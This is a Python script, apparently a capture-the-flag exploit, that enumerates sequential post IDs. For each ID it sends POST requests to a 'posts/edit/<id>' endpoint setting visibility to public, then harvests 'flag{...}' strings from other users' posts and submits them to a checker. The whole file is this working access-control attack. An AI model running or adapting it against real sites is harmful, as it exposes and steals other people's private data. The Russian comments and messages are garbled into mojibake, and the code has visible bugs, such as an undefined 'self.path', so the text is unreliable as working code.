from bs4 import BeautifulSoup
import time


ID_CHECK_DEPTH = 20 # —Å–∫–æ–ª—å–∫–æ –º–∞–∫—Å–∏–º—É–º –Ω–µ—Å—É—â–µ—Å—Ç–≤—É—é—â–∏—Ö –ø–æ–¥—Ä—è–¥ –∞–∫–∫–∞—É–Ω—Ç–æ–≤ –ø–æ–ø–∞–¥–∞—é—Ç –ø–æ–¥ —Ü–∏–∫–ª
MAX_ID_NUMBER = 10000 # –º–∞–∫—Å–∏–º–∞–ª—å–Ω—ã–π ID


class FlagSniffer:
    def __init__(self, session, url, flags_file, headers,id_file, url_checker):
        self.session = session
        self.url = url
        self.flags_file = flags_file
        self.headers = headers
        self.id_file = id_file
        self.url_checker = url_checker


    def get_ids_from_last_id(self,last_id):
        for i in range(last_id, MAX_ID_NUMBER+1):
            yield i


    def sniff(self):

        f = open(self.flags_file, "r+")
        old_flags = {i.strip() for i in f.readlines()}
        
        new_flags = set()
       

        url_posts = self.url + "posts/edit/"    
        data = {"visibility": "public"}
        print("–ù–∞—á–∞–ª –ø—Ä–æ–≤–µ—Ä—è—Ç—å ID'—à–Ω–∏–∫–∏...")
        do_not_exist_number = 0

        with open(self.id_file, 'r+') as lastIDFile: 
            last_id = int(lastIDFile.readline().strip()) + 1

        print(f"–ù–∞—á–∞–ª —Å ID {last_id}")

        for id in self.get_ids_from_last_id(last_id):
            print(id)
            try:
                post_id_request = self.session.post(url_posts+str(id), data, headers=self.headers)
            except Exception:
                print(f"–ù–ï —Å–º–æ–≥ –ø—Ä–æ–≤–µ—Ä–∏—Ç—å ID {id}")

            if post_id_request.status_code == 200:
                # —Å–±—Ä–∞—Å—ã–≤–∞–µ–º —Å—á–µ—Ç—á–∏–∫ –Ω–µ—Å—É—â–µ—Å—Ç–≤—É—é—â–∏—Ö ID
                do_not_exist_number = 0
                                
                # –ü–∞—Ä—Å–∏–º JSON –æ—Ç–≤–µ—Ç
                json_data = post_id_request.json()
                

                # –ò–∑–≤–ª–µ–∫–∞–µ–º –∫–æ–Ω—Ç–µ–Ω—Ç –∏–∑ JSON
                content = json_data.get("post", {}).get("content", "")
                
                # –ò—â–µ–º —Ñ–ª–∞–≥ –≤ —Ñ–æ—Ä–º–∞—Ç–µ flag{...}
                if content.startswith("flag{"):
                    # –ø—Ä–æ–≤–µ—Ä—è–µ–º —Ñ–ª–∞–≥
                    flag = self.check_flag(content)

                    if flag is not None:
                        print("–ù–∞–π–¥–µ–Ω –≤–µ—Ä–Ω—ã–π —Ñ–ª–∞–≥!")
                        


                        new_flags.add(content)
                       
            else:
                do_not_exist_number += 1
                if do_not_exist_number >= ID_CHECK_DEPTH:
                    print(f"{ID_CHECK_DEPTH} –ø–æ–¥—Ä—è–¥ ID'—à–Ω–∏–∫–æ–≤ –Ω–µ —Å—É—â–µ—Å—Ç–≤—É—é—Ç, –ø—Ä–µ–∫—Ä–∞—â–∞—é –ø–æ–∏—Å–∫...")
                    break

            time.sleep(0.15)
            
        flags = new_flags.difference(old_flags)

        # –î–æ–±–∞–≤–ª—è–µ–º –Ω–æ–≤—ã–µ —Ñ–ª–∞–≥–∏ –≤ —Ñ–∞–π–ª
        for i in flags:
            f.write(i+"\n")
        
        # –¥–æ–±–∞–≤–ª—è–µ–º —ç—Ç–æ—Ç ID –∫–∞–∫ –ø–æ—Å–ª–µ–¥–Ω–∏–π –≤ —Ñ–∞–π–ª
        with open(self.id_file,'w') as lastIDFile:
            lastIDFile.write(str(id)+'\n')

        f.close()
        flag_length = len(flags) 
        if flag_length > 0:
            print(f"–Ø –Ω–∞—à–µ–ª –Ω–æ–≤—ã–µ —Ñ–ª–∞–≥–∏! –ò—Ö —Ü–µ–ª—ã—Ö {flag_length} —à—Ç—É–∫")        
        if flag_length == 0:
            print('–ù–æ–≤—ã—Ö —Ñ–ª–∞–≥–æ–≤ –Ω–µ –Ω–∞–π–¥–µ–Ω–æ üò≠')
        return flags
    
    def check_flag(self,flag):
        url = self.path + flag
        print(f"–ü—Ä–æ–≤–µ—Ä—è—é {flag}")
        if self.session.get(url).text.strip() == '–í–µ—Ä–Ω—ã–π —Ñ–ª–∞–≥':
            return flag
        return None
    